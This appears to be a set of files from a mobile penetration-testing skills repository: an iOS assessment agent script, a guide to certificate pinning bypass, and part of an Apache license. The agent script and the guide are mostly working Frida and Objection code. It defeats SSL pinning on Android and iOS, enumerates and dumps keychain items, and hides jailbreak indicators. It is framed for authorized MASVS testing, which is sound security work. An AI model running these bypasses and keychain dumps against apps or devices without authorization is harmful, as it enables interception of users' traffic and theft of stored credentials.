| frida-tools | >=12.0 | CLI utilities (frida-ps, frida-trace) for device interaction |
| objection | >=1.11 | High-level Frida-powered mobile security exploration toolkit |

## CLI Usage

```bash
# Static IPA analysis only
python agent.py --ipa target.ipa --output-dir ./analysis

# Dynamic testing with SSL pinning bypass and keychain dump
python agent.py --bundle-id com.target.app --ssl-bypass --keychain --output report.json

# Full assessment with jailbreak bypass
python agent.py --bundle-id com.target.app --ipa target.ipa \
  --ssl-bypass --keychain --jailbreak-bypass \
  --device usb --frida-timeout 45 --output full_report.json
```

## Arguments

| Argument | Required | Description |
|----------|----------|-------------|
| `--bundle-id` | Conditional | Target app bundle identifier for dynamic testing |
| `--ipa` | Conditional | Path to IPA file for static analysis |
| `--device` | No | Frida device type: `usb`, `remote`, `local` (default: `usb`) |
| `--ssl-bypass` | No | Execute SSL pinning bypass Frida script |
| `--keychain` | No | Dump and analyze keychain item security |
| `--jailbreak-bypass` | No | Execute jailbreak detection bypass script |
| `--frida-timeout` | No | Frida script execution timeout in seconds (default: 30) |
| `--output` | No | Output report file path (default: `ios_assessment_report.json`) |
| `--output-dir` | No | Directory for IPA extraction artifacts (default: `.`) |

At least one of `--bundle-id` or `--ipa` is required.

## Key Functions

### `analyze_ipa_static(ipa_path, output_dir)`
Extracts and statically analyzes an IPA package. Checks Info.plist for ATS configuration, URL schemes, and background modes. Scans binary strings for hardcoded API keys, secrets, AWS credentials, Firebase URLs, and private keys. Inspects provisioning profile for debug entitlements.

### `run_frida_script(target_bundle, script_source, device_type, timeout_sec)`
Executes a Frida JavaScript payload against a target iOS app. Attempts to attach to a running process first, falls back to spawning the app. Collects messages sent from the Frida script via the `send()` API.

### `run_objection_command(bundle_id, command)`
Runs a single Objection command against the target app using subprocess. Returns stdout, stderr, and return code. Handles timeout and missing installation gracefully.

### `assess_keychain_security(bundle_id)`
Dumps keychain items via Objection and analyzes accessibility attributes. Flags items using insecure attributes (kSecAttrAccessibleAlways, kSecAttrAccessibleAfterFirstUnlock) and passwords lacking biometric/passcode access control.

### `generate_report(findings, target_app, output_path)`
Aggregates all findings into a JSON report with severity breakdown (critical/high/medium/low) and metadata including timestamp and target identifier.

## Frida Script Payloads

| Script | Target APIs | Purpose |
|--------|-------------|---------|
| `SSL_PINNING_BYPASS_SCRIPT` | SecTrustEvaluate, SecTrustEvaluateWithError, AFSecurityPolicy, TSKPinningValidator | Bypasses certificate pinning across system and third-party frameworks |
| `KEYCHAIN_DUMP_SCRIPT` | SecItemCopyMatching | Enumerates keychain item classes and counts accessible items |
| `JAILBREAK_DETECTION_BYPASS_SCRIPT` | NSFileManager, UIApplication canOpenURL, fork() | Hides jailbreak indicators from filesystem, URL scheme, and process checks |

## OWASP MASVS Coverage

| MASVS Category | Tests | Functions |
|----------------|-------|-----------|
| MASVS-STORAGE | MASTG-TEST-0055, 0058 | `assess_keychain_security`, `analyze_ipa_static` |
| MASVS-NETWORK | MASTG-TEST-0066, 0068 | SSL pinning bypass, ATS configuration check |
| MASVS-RESILIENCE | MASTG-TEST-0079, 0083 | Jailbreak bypass, debug entitlement check |
| MASVS-PLATFORM | MASTG-TEST-0075 | URL scheme analysis |

===== END FILE =====


===== FILE: skills/performing-ios-app-security-assessment/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized penetration testing and lab environments only
"""iOS App Security Assessment Agent - Automates Frida-based iOS security testing including
SSL pinning bypass, keychain extraction, IPA static analysis, and runtime method hooking."""

import argparse
import json
import logging
import os
import plistlib
import re
import subprocess
import sys
import zipfile
from datetime import datetime
from pathlib import Path

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# Frida JavaScript payloads for iOS instrumentation
SSL_PINNING_BYPASS_SCRIPT = r"""
'use strict';

// Hook NSURLSessionDelegate certificate challenge methods
if (ObjC.available) {
    try {
        // Bypass NSURLSession certificate pinning
        var NSURLSessionTask = ObjC.classes.NSURLSessionTask;
        var resolveMethod = ObjC.classes.NSURLSession['- URLSession:didReceiveChallenge:completionHandler:'];

        Interceptor.attach(
            ObjC.classes.NSURLSession['- URLSession:didReceiveChallenge:completionHandler:'].implementation, {
            onEnter: function(args) {
                send('[SSL Bypass] Intercepted NSURLSession challenge');
            }
        });
    } catch(e) {}

    // Hook SecTrustEvaluate to always return success
    try {
        var SecTrustEvaluate = Module.findExportByName('Security', 'SecTrustEvaluate');
        if (SecTrustEvaluate) {
            Interceptor.attach(SecTrustEvaluate, {
                onLeave: function(retval) {
                    retval.replace(0); // errSecSuccess
                    send('[SSL Bypass] SecTrustEvaluate -> success');
                }
            });
        }
    } catch(e) {}

    // Hook SecTrustEvaluateWithError (iOS 12+)
    try {
        var SecTrustEvaluateWithError = Module.findExportByName('Security', 'SecTrustEvaluateWithError');
        if (SecTrustEvaluateWithError) {
            Interceptor.attach(SecTrustEvaluateWithError, {
                onLeave: function(retval) {
                    retval.replace(1); // true = trusted
                    send('[SSL Bypass] SecTrustEvaluateWithError -> trusted');
                }
            });
        }
    } catch(e) {}

    // Hook SecTrustGetTrustResult
    try {
        var SecTrustGetTrustResult = Module.findExportByName('Security', 'SecTrustGetTrustResult');
        if (SecTrustGetTrustResult) {
            Interceptor.attach(SecTrustGetTrustResult, {
                onLeave: function(retval) {
                    retval.replace(0);
                    send('[SSL Bypass] SecTrustGetTrustResult -> proceed');
                }
            });
        }
    } catch(e) {}

    // Bypass AFNetworking pinning
    try {
        var AFSecurityPolicy = ObjC.classes.AFSecurityPolicy;
        if (AFSecurityPolicy) {
            Interceptor.attach(AFSecurityPolicy['- setSSLPinningMode:'].implementation, {
                onEnter: function(args) {
                    args[2] = ptr(0); // AFSSLPinningModeNone
                    send('[SSL Bypass] AFNetworking pinning disabled');
                }
            });
        }
    } catch(e) {}

    // Bypass TrustKit pinning
    try {
        var TrustKit = ObjC.classes.TSKPinningValidator;
        if (TrustKit) {
            Interceptor.attach(TrustKit['- evaluateTrust:forHostname:'].implementation, {
                onLeave: function(retval) {
                    retval.replace(0); // TSKTrustEvaluationSuccess
                    send('[SSL Bypass] TrustKit pinning bypassed');
                }
            });
        }
    } catch(e) {}

    send('[SSL Bypass] All hooks installed successfully');
} else {
    send('[SSL Bypass] Objective-C runtime not available');
}
"""

KEYCHAIN_DUMP_SCRIPT = r"""
'use strict';

if (ObjC.available) {
    var SecItemCopyMatching = Module.findExportByName('Security', 'SecItemCopyMatching');
    var results = [];

    // Enumerate keychain item classes
    var kSecClasses = [
        'genp',  // kSecClassGenericPassword
        'inet',  // kSecClassInternetPassword
        'cert',  // kSecClassCertificate
        'keys',  // kSecClassKey
        'idnt'   // kSecClassIdentity
    ];

    var classNames = {
        'genp': 'GenericPassword',
        'inet': 'InternetPassword',
        'cert': 'Certificate',
        'keys': 'CryptoKey',
        'idnt': 'Identity'
    };

    for (var i = 0; i < kSecClasses.length; i++) {
        try {
            var query = ObjC.classes.NSMutableDictionary.alloc().init();
            query.setObject_forKey_(kSecClasses[i], 'class');
            query.setObject_forKey_(ObjC.classes.__NSCFBoolean.numberWithBool_(true), 'r_Ref');
            query.setObject_forKey_('m_LimitAll', 'm_Limit');
            query.setObject_forKey_(ObjC.classes.__NSCFBoolean.numberWithBool_(true), 'r_Data');
            query.setObject_forKey_(ObjC.classes.__NSCFBoolean.numberWithBool_(true), 'r_Attributes');

            var resultPtr = Memory.alloc(Process.pointerSize);
            var status = new NativeFunction(SecItemCopyMatching, 'int', ['pointer', 'pointer']);
            var ret = status(query.handle, resultPtr);

            if (ret === 0) {
                var resultObj = new ObjC.Object(resultPtr.readPointer());
                send({
                    type: 'keychain',
                    class: classNames[kSecClasses[i]],
                    count: resultObj.count ? resultObj.count() : 1
                });
            }
        } catch(e) {
            send({type: 'keychain_error', class: classNames[kSecClasses[i]], error: e.toString()});
        }
    }
    send({type: 'keychain_complete'});
}
"""

JAILBREAK_DETECTION_BYPASS_SCRIPT = r"""
'use strict';

if (ObjC.available) {
    // Hook NSFileManager fileExistsAtPath: to hide jailbreak indicators
    var NSFileManager = ObjC.classes.NSFileManager;
    var fileExistsAtPath = NSFileManager['- fileExistsAtPath:'];

    var jailbreakPaths = [
        '/Applications/Cydia.app',
        '/Applications/Sileo.app',
        '/Library/MobileSubstrate/MobileSubstrate.dylib',
        '/bin/bash', '/usr/sbin/sshd', '/etc/apt',
        '/usr/bin/ssh', '/private/var/lib/apt/',
        '/private/var/lib/cydia', '/private/var/tmp/cydia.log',
        '/var/lib/dpkg/info', '/usr/libexec/cydia/'
    ];

    Interceptor.attach(fileExistsAtPath.implementation, {
        onEnter: function(args) {
            this.path = ObjC.Object(args[2]).toString();
        },
        onLeave: function(retval) {
            for (var i = 0; i < jailbreakPaths.length; i++) {
                if (this.path.indexOf(jailbreakPaths[i]) !== -1) {
                    retval.replace(0); // false
                    send('[JB Bypass] Hidden: ' + this.path);
                    break;
                }
            }
        }
    });

    // Hook canOpenURL to block cydia:// scheme detection
    var UIApplication = ObjC.classes.UIApplication;
    Interceptor.attach(UIApplication['- canOpenURL:'].implementation, {
        onEnter: function(args) {
            this.url = ObjC.Object(args[2]).toString();
        },
        onLeave: function(retval) {
            if (this.url.indexOf('cydia://') !== -1 || this.url.indexOf('sileo://') !== -1) {
                retval.replace(0);
                send('[JB Bypass] Blocked URL scheme: ' + this.url);
            }
        }
    });

    // Hook fork() to prevent fork-based jailbreak detection
    var fork = Module.findExportByName(null, 'fork');
    if (fork) {
        Interceptor.attach(fork, {
            onLeave: function(retval) {
                retval.replace(-1); // fork fails on non-jailbroken
                send('[JB Bypass] fork() returned -1');
            }
        });
    }

    send('[JB Bypass] All jailbreak detection bypasses installed');
}
"""


def analyze_ipa_static(ipa_path, output_dir):
    """Perform static analysis on an IPA file."""
    findings = []
    extract_dir = os.path.join(output_dir, "ipa_extracted")

    if not zipfile.is_zipfile(ipa_path):
        logger.error("Not a valid IPA/ZIP file: %s", ipa_path)
        return findings

    with zipfile.ZipFile(ipa_path, "r") as zf:
        zf.extractall(extract_dir)
    logger.info("Extracted IPA to %s", extract_dir)

    # Find the .app directory
    payload_dir = os.path.join(extract_dir, "Payload")
    if not os.path.isdir(payload_dir):
        logger.error("No Payload directory found in IPA")
        return findings

    app_dirs = [d for d in os.listdir(payload_dir) if d.endswith(".app")]
    if not app_dirs:
        logger.error("No .app bundle found in Payload")
        return findings

    app_path = os.path.join(payload_dir, app_dirs[0])
    logger.info("Analyzing app bundle: %s", app_dirs[0])

    # Parse Info.plist
    info_plist_path = os.path.join(app_path, "Info.plist")
    if os.path.exists(info_plist_path):
        with open(info_plist_path, "rb") as f:
            try:
                plist_data = plistlib.load(f)
            except Exception:
                plist_data = {}

        # Check App Transport Security configuration
        ats = plist_data.get("NSAppTransportSecurity", {})
        if ats.get("NSAllowsArbitraryLoads", False):
            findings.append({
                "id": "IOS-STATIC-001",
                "severity": "Medium",
                "title": "App Transport Security Disabled",
                "detail": "NSAllowsArbitraryLoads is set to true, allowing cleartext HTTP traffic",
                "masvs": "MASVS-NETWORK",
                "mastg": "MASTG-TEST-0066",
            })

        # Check URL schemes for deep link hijacking potential
        url_types = plist_data.get("CFBundleURLTypes", [])
        custom_schemes = []
        for url_type in url_types:
            schemes = url_type.get("CFBundleURLSchemes", [])
            custom_schemes.extend(schemes)
        if custom_schemes:
            findings.append({
                "id": "IOS-STATIC-002",
                "severity": "Informational",
                "title": "Custom URL Schemes Registered",
                "detail": f"App registers URL schemes: {', '.join(custom_schemes)}. "
                          "Test for deep link hijacking and parameter injection.",
                "masvs": "MASVS-PLATFORM",
                "mastg": "MASTG-TEST-0075",
            })

        # Check for background modes that could leak data
        bg_modes = plist_data.get("UIBackgroundModes", [])
        if bg_modes:
            findings.append({
                "id": "IOS-STATIC-003",
                "severity": "Informational",
                "title": "Background Execution Modes Enabled",
                "detail": f"Background modes: {', '.join(bg_modes)}. "
                          "Verify sensitive operations are not exposed in background.",
                "masvs": "MASVS-STORAGE",
                "mastg": "MASTG-TEST-0058",
            })

    # Scan binary strings for hardcoded secrets
    executable_name = plist_data.get("CFBundleExecutable", app_dirs[0].replace(".app", ""))
    executable_path = os.path.join(app_path, executable_name)

    if os.path.exists(executable_path):
        secret_patterns = [
            (r'(?i)api[_-]?key\s*[:=]\s*["\'][A-Za-z0-9_\-]{16,}', "Hardcoded API Key"),
            (r'(?i)secret\s*[:=]\s*["\'][A-Za-z0-9_\-]{8,}', "Hardcoded Secret"),
            (r'(?i)password\s*[:=]\s*["\'][^"\']{4,}', "Hardcoded Password"),
            (r'https?://[a-zA-Z0-9._\-]+\.firebaseio\.com', "Firebase URL"),
            (r'AIza[0-9A-Za-z_\-]{35}', "Google API Key"),
            (r'AKIA[0-9A-Z]{16}', "AWS Access Key ID"),
            (r'-----BEGIN (?:RSA )?PRIVATE KEY-----', "Embedded Private Key"),
        ]

        try:
            result = subprocess.run(
                ["strings", executable_path],
                capture_output=True, text=True, timeout=60,
            )
            binary_strings = result.stdout
        except (subprocess.SubprocessError, FileNotFoundError):
            binary_strings = ""
            try:
                with open(executable_path, "rb") as f:
                    raw = f.read()
                binary_strings = raw.decode("ascii", errors="ignore")
            except Exception:
                pass

        for pattern, label in secret_patterns:
            matches = re.findall(pattern, binary_strings)
            if matches:
                findings.append({
                    "id": "IOS-STATIC-004",
                    "severity": "High",
                    "title": f"{label} Found in Binary",
                    "detail": f"Pattern match for {label}: {len(matches)} occurrence(s) found. "
                              f"Sample: {matches[0][:60]}...",
                    "masvs": "MASVS-STORAGE",
                    "mastg": "MASTG-TEST-0058",
                })

    # Check for embedded provisioning profile
    provision_path = os.path.join(app_path, "embedded.mobileprovision")
    if os.path.exists(provision_path):
        try:
            result = subprocess.run(
                ["security", "cms", "-D", "-i", provision_path],
                capture_output=True, text=True, timeout=30,
            )
            if "get-task-allow" in result.stdout and "<true/>" in result.stdout:
                findings.append({
                    "id": "IOS-STATIC-005",
                    "severity": "Medium",
                    "title": "Debug Entitlement Enabled (get-task-allow)",
                    "detail": "The provisioning profile has get-task-allow=true, "
                              "indicating a development/debug build that allows attaching debuggers.",
                    "masvs": "MASVS-RESILIENCE",
                    "mastg": "MASTG-TEST-0083",
                })
        except (subprocess.SubprocessError, FileNotFoundError):
            pass

    # Check for unprotected frameworks
    frameworks_dir = os.path.join(app_path, "Frameworks")
    if os.path.isdir(frameworks_dir):
        frameworks = [f for f in os.listdir(frameworks_dir) if f.endswith(".framework")]
        if frameworks:
            findings.append({
                "id": "IOS-STATIC-006",
                "severity": "Informational",
                "title": "Embedded Frameworks Inventory",
                "detail": f"App embeds {len(frameworks)} frameworks: {', '.join(frameworks[:10])}. "
                          "Review for known vulnerable versions.",
                "masvs": "MASVS-RESILIENCE",
                "mastg": "MASTG-TEST-0083",
            })

    logger.info("Static analysis complete: %d findings", len(findings))
    return findings


def run_frida_script(target_bundle, script_source, device_type="usb", timeout_sec=30):
    """Execute a Frida script against a target iOS application."""
    messages = []

    try:
        import frida
    except ImportError:
        logger.error("Frida Python bindings not installed: pip install frida")
        return messages

    def on_message(message, data):
        if message["type"] == "send":
            payload = message["payload"]
            messages.append(payload)
            logger.info("Frida: %s", payload)
        elif message["type"] == "error":
            logger.error("Frida error: %s", message.get("description", ""))

    try:
        if device_type == "usb":
            device = frida.get_usb_device(timeout=10)
        elif device_type == "remote":
            device = frida.get_remote_device()
        else:
            device = frida.get_local_device()

        logger.info("Attached to device: %s", device.name)

        # Try to attach to running process first
        try:
            pid = device.get_process(target_bundle).pid
            session = device.attach(pid)
            logger.info("Attached to running process PID %d", pid)
        except frida.ProcessNotFoundError:
            # Spawn the app
            pid = device.spawn([target_bundle])
            session = device.attach(pid)
            device.resume(pid)
            logger.info("Spawned and attached to PID %d", pid)

        script = session.create_script(script_source)
        script.on("message", on_message)
        script.load()

        import time
        time.sleep(timeout_sec)

        script.unload()
        session.detach()

    except Exception as e:
        logger.error("Frida execution failed: %s", e)
        messages.append({"error": str(e)})

    return messages


def run_objection_command(bundle_id, command):
    """Execute an Objection command against a target app."""
    try:
        result = subprocess.run(
            ["objection", "--gadget", bundle_id, "run", command],
            capture_output=True, text=True, timeout=60,
        )
        return {"command": command, "stdout": result.stdout, "stderr": result.stderr,
                "returncode": result.returncode}
    except FileNotFoundError:
        logger.error("Objection not found: pip install objection")
        return {"command": command, "error": "objection not installed"}
    except subprocess.TimeoutExpired:
        logger.warning("Objection command timed out: %s", command)
        return {"command": command, "error": "timeout"}


def assess_keychain_security(bundle_id):
    """Dump and analyze keychain items for insecure storage practices."""
    findings = []
    result = run_objection_command(bundle_id, "ios keychain dump --json")

    if result.get("error"):
        logger.warning("Keychain dump failed: %s", result.get("error"))
        return findings

    try:
        items = json.loads(result["stdout"])
    except (json.JSONDecodeError, KeyError):
        logger.warning("Could not parse keychain dump output")
        return findings

    insecure_accessibility = [
        "kSecAttrAccessibleAlways",
        "kSecAttrAccessibleAlwaysThisDeviceOnly",
        "kSecAttrAccessibleAfterFirstUnlock",
    ]

    for item in items:
        accessible = item.get("accessible", "")
        if any(a in accessible for a in insecure_accessibility):
            findings.append({
                "id": "IOS-KEYCHAIN-001",
                "severity": "High",
                "title": "Insecure Keychain Accessibility Attribute",
                "detail": f"Keychain item '{item.get('service', 'unknown')}' uses "
                          f"accessibility '{accessible}'. Data may be accessible "
                          "without device unlock.",
                "masvs": "MASVS-STORAGE",
                "mastg": "MASTG-TEST-0055",
            })

        # Check for unprotected password items
        if item.get("class") == "genp" and not item.get("accessControl"):
            findings.append({
                "id": "IOS-KEYCHAIN-002",
                "severity": "Medium",
                "title": "Keychain Password Without Access Control",
                "detail": f"Generic password '{item.get('service', 'unknown')}' lacks "
                          "biometric or passcode access control constraints.",
                "masvs": "MASVS-STORAGE",
                "mastg": "MASTG-TEST-0055",
            })

    logger.info("Keychain analysis: %d findings from %d items", len(findings), len(items))
    return findings


def generate_report(findings, target_app, output_path):
    """Generate comprehensive iOS security assessment report."""
    critical = [f for f in findings if f.get("severity") == "Critical"]
    high = [f for f in findings if f.get("severity") == "High"]
    medium = [f for f in findings if f.get("severity") == "Medium"]
    low = [f for f in findings if f.get("severity") in ("Low", "Informational")]

    report = {
        "assessment": "iOS Application Security Assessment",
        "target": target_app,
        "timestamp": datetime.utcnow().isoformat(),
        "summary": {
            "total_findings": len(findings),
            "critical": len(critical),
            "high": len(high),
            "medium": len(medium),
            "low_informational": len(low),
        },
        "findings": findings,
    }

    with open(output_path, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s (%d findings)", output_path, len(findings))
    return report


def main():
    parser = argparse.ArgumentParser(
        description="iOS App Security Assessment Agent - Frida/Objection-based testing"
    )
    parser.add_argument("--bundle-id", help="Target app bundle identifier (e.g., com.target.app)")
    parser.add_argument("--ipa", help="Path to IPA file for static analysis")
    parser.add_argument("--device", choices=["usb", "remote", "local"], default="usb",
                        help="Frida device type (default: usb)")
    parser.add_argument("--ssl-bypass", action="store_true",
                        help="Run SSL pinning bypass script")
    parser.add_argument("--keychain", action="store_true",
                        help="Dump and analyze keychain security")
    parser.add_argument("--jailbreak-bypass", action="store_true",
                        help="Run jailbreak detection bypass")
    parser.add_argument("--frida-timeout", type=int, default=30,
                        help="Frida script execution timeout in seconds")
    parser.add_argument("--output", default="ios_assessment_report.json",
                        help="Output report file path")
    parser.add_argument("--output-dir", default=".",
                        help="Directory for extracted IPA and artifacts")
    args = parser.parse_args()

    if not args.bundle_id and not args.ipa:
        parser.error("Provide --bundle-id for dynamic testing or --ipa for static analysis")

    findings = []

    # Static analysis of IPA
    if args.ipa:
        logger.info("=== IPA Static Analysis ===")
        findings.extend(analyze_ipa_static(args.ipa, args.output_dir))

    # Dynamic analysis with Frida/Objection
    if args.bundle_id:
        if args.ssl_bypass:
            logger.info("=== SSL Pinning Bypass ===")
            msgs = run_frida_script(args.bundle_id, SSL_PINNING_BYPASS_SCRIPT,
                                    args.device, args.frida_timeout)
            if any("success" in str(m).lower() for m in msgs):
                findings.append({
                    "id": "IOS-NET-001",
                    "severity": "Informational",
                    "title": "SSL Pinning Successfully Bypassed",
                    "detail": "Certificate pinning was bypassed using Frida hooks on "
                              "SecTrustEvaluate, SecTrustEvaluateWithError, and framework-specific "
                              "trust evaluation methods. Traffic can be intercepted via proxy.",
                    "masvs": "MASVS-NETWORK",
                    "mastg": "MASTG-TEST-0068",
                })

        if args.jailbreak_bypass:
            logger.info("=== Jailbreak Detection Bypass ===")
            msgs = run_frida_script(args.bundle_id, JAILBREAK_DETECTION_BYPASS_SCRIPT,
                                    args.device, args.frida_timeout)
            if any("bypass" in str(m).lower() for m in msgs):
                findings.append({
                    "id": "IOS-RES-001",
                    "severity": "Medium",
                    "title": "Jailbreak Detection Bypassed at Runtime",
                    "detail": "Jailbreak detection checks (file existence, URL scheme, fork) "
                              "were all bypassed using Frida method hooks.",
                    "masvs": "MASVS-RESILIENCE",
                    "mastg": "MASTG-TEST-0079",
                })

        if args.keychain:
            logger.info("=== Keychain Security Analysis ===")
            findings.extend(assess_keychain_security(args.bundle_id))

    target_name = args.bundle_id or args.ipa or "unknown"
    report = generate_report(findings, target_name, args.output)

    print(json.dumps(report["summary"], indent=2))


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-mobile-app-certificate-pinning-bypass/SKILL.md =====
---
name: performing-mobile-app-certificate-pinning-bypass
description: 'Bypasses SSL/TLS certificate pinning implementations in Android and
  iOS applications to enable traffic interception during authorized security assessments.
  Covers OkHttp, TrustManager, NSURLSession, and third-party pinning library bypass
  techniques using Frida, Objection, and custom scripts. Activates for requests involving
  certificate pinning bypass, SSL pinning defeat, mobile TLS interception, or proxy-resistant
  app testing.

  '
domain: cybersecurity
subdomain: mobile-security
author: mahipal
tags:
- mobile-security
- android
- ios
- certificate-pinning
- frida
- penetration-testing
version: 1.0.0
license: Apache-2.0
nist_csf:
- PR.PS-01
- PR.AA-05
- ID.RA-01
- DE.CM-09
mitre_attack:
- T1059
- T1056
- T1036
- T1078
- T1027
---
# Performing Mobile App Certificate Pinning Bypass

## When to Use

Use this skill when:
- Mobile app refuses connections through a proxy due to certificate pinning
- Performing authorized security testing requiring HTTPS traffic interception
- Assessing the strength and bypass difficulty of pinning implementations
- Evaluating defense-in-depth of mobile app network security

**Do not use** to bypass pinning on apps without explicit testing authorization.

## Prerequisites

- Burp Suite configured as proxy with listener on all interfaces
- Rooted Android device or jailbroken iOS device
- Frida server running on target device
- Objection installed (`pip install objection`)
- Target app installed and reproducing the pinning behavior

## Workflow

### Step 1: Identify Pinning Implementation

**Android pinning methods to identify:**
```
1. Network Security Config (res/xml/network_security_config.xml)
   <pin-set> with certificate hash pins

2. OkHttp CertificatePinner
   CertificatePinner.Builder().add("api.target.com", "sha256/...")

3. Custom TrustManager
   X509TrustManager overrides in code

4. Third-party libraries
   - TrustKit
   - Certificate Transparency checks
```

**iOS pinning methods:**
```
1. NSURLSession delegate (URLSession:didReceiveChallenge:)
2. ATS (App Transport Security) with custom trust evaluation
3. TrustKit framework
4. Alamofire ServerTrustPolicy
5. Custom SecTrust evaluation
```

### Step 2: Bypass with Objection (Quickest Approach)

```bash
# Android
objection --gadget com.target.app explore
android sslpinning disable

# iOS
objection --gadget com.target.app explore
ios sslpinning disable
```

Objection hooks common pinning implementations including OkHttp CertificatePinner, TrustManagerImpl, NSURLSession delegate methods, and SecTrust evaluation.

### Step 3: Bypass with Custom Frida Scripts

**Android - Universal SSL Pinning Bypass:**
```javascript
// android_ssl_bypass.js
Java.perform(function() {
    // Bypass TrustManagerImpl
    var TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain,
        host, clientAuth, ocspData, tlsSctData) {
        console.log("[+] Bypassing TrustManagerImpl for: " + host);
        return untrustedChain;
    };

    // Bypass OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload("java.lang.String", "java.util.List").implementation =
            function(hostname, peerCertificates) {
                console.log("[+] Bypassing OkHttp3 pinning for: " + hostname);
                return;
            };
    } catch(e) {}

    // Bypass custom X509TrustManager
    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var TrustManager = Java.registerClass({
        name: "com.bypass.TrustManager",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    // Bypass SSLContext
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    SSLContext.init.overload("[Ljavax.net.ssl.KeyManager;",
        "[Ljavax.net.ssl.TrustManager;", "java.security.SecureRandom").implementation =
        function(km, tm, sr) {
            console.log("[+] Replacing TrustManagers in SSLContext.init");
            this.init(km, [TrustManager.$new()], sr);
        };

    // Bypass NetworkSecurityConfig (Android 7+)
    try {
        var NetworkSecurityConfig = Java.use(
            "android.security.net.config.NetworkSecurityConfig");
        NetworkSecurityConfig.isCleartextTrafficPermitted.implementation = function() {
            return true;
        };
    } catch(e) {}

    console.log("[*] SSL pinning bypass loaded");
});
```

```bash
frida -U -f com.target.app -l android_ssl_bypass.js --no-pause
```

**iOS - Universal SSL Pinning Bypass:**
```javascript
// ios_ssl_bypass.js
if (ObjC.available) {
    // Bypass NSURLSession delegate
    var resolver = new ApiResolver("objc");
    resolver.enumerateMatches(
        "-[* URLSession:didReceiveChallenge:completionHandler:]", {
        onMatch: function(match) {
            Interceptor.attach(match.address, {
                onEnter: function(args) {
                    var completionHandler = new ObjC.Block(args[4]);
                    var NSURLSessionAuthChallengeUseCredential = 0;
                    var trust = new ObjC.Object(args[3])
                        .protectionSpace().serverTrust();
                    var credential = ObjC.classes.NSURLCredential
                        .credentialForTrust_(trust);
                    completionHandler.invoke(NSURLSessionAuthChallengeUseCredential,
                        credential);
                }
            });
        },
        onComplete: function() {}
    });

    // Bypass SecTrustEvaluate
    var SecTrustEvaluateWithError = Module.findExportByName(
        "Security", "SecTrustEvaluateWithError");
    if (SecTrustEvaluateWithError) {
        Interceptor.replace(SecTrustEvaluateWithError, new NativeCallback(
            function(trust, error) {
                return 1;  // Always return true
            }, "bool", ["pointer", "pointer"]
        ));
    }

    console.log("[*] iOS SSL pinning bypass loaded");
}
```

### Step 4: Handle Advanced Pinning

For apps using advanced pinning (TrustKit, custom binary checks):

```bash
# Identify the specific pinning library
frida-trace -U -n TargetApp -m "*[*Trust*]" -m "*[*Pin*]" -m "*[*SSL*]" -m "*[*Certificate*]"

# Hook the identified validation function
# Custom Frida script targeting the specific implementation
```

### Step 5: Verify Bypass Success

After applying the bypass:
1. Configure device proxy to Burp Suite
2. Open target app and navigate through authenticated flows
3. Verify HTTPS traffic appears in Burp Suite HTTP History
4. Check for any remaining pinned connections that are not captured

## Key Concepts

| Term | Definition |
|------|-----------|
| **Certificate Pinning** | Restricting accepted server certificates to a known set, preventing MITM via rogue CA certificates |
| **Public Key Pinning** | Pinning the server's public key hash rather than the full certificate, surviving certificate rotation |
| **Network Security Config** | Android XML configuration for declaring trust anchors, pins, and cleartext policy per-domain |
| **TrustKit** | Open-source library implementing certificate pinning with reporting for both Android and iOS |
| **HPKP Deprecation** | HTTP Public Key Pinning header was deprecated in browsers but concept persists in mobile apps |

## Tools & Systems

- **Objection**: Pre-built pinning bypass for common libraries (OkHttp, NSURLSession, TrustKit)
- **Frida**: Custom JavaScript hooks targeting specific pinning implementations
- **apktool**: APK decompilation for identifying pinning in Network Security Config
- **SSLUnpinning (Xposed)**: Xposed framework module for system-wide pinning bypass on Android
- **ssl-kill-switch2**: iOS tweak for disabling SSL pinning system-wide on jailbroken devices

## Common Pitfalls

- **Certificate transparency**: Some apps check CT logs in addition to pinning. May need to bypass CT verification separately.
- **Multi-layer pinning**: Apps may implement pinning at multiple levels (OkHttp + custom TrustManager). Bypass all layers.
- **Binary-level pinning**: Some apps validate certificates in native C/C++ code, which requires Interceptor.attach at native function addresses rather than Java/ObjC hooks.
- **Dynamic pinning updates**: Apps using TrustKit or similar may fetch updated pins from a server. Monitor for pin rotation during testing.

===== END FILE =====


===== FILE: skills/performing-mobile-app-certificate-pinning-bypass/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
